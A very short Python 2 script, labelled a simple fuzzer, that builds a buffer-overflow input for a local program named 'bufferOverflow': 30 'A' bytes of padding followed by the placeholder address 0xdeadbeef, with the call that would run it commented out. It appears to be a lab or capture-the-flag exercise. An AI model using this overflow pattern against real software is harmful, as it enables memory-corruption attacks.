#!/usr/env python2
#Simple fuzzer

import subprocess

param = "bufferOverflow "

param += 30 * 'A'
param += chr(0xde) + chr(0xad) + chr(0xbe) + chr(0xef)

print param
#subprocess.call(param)
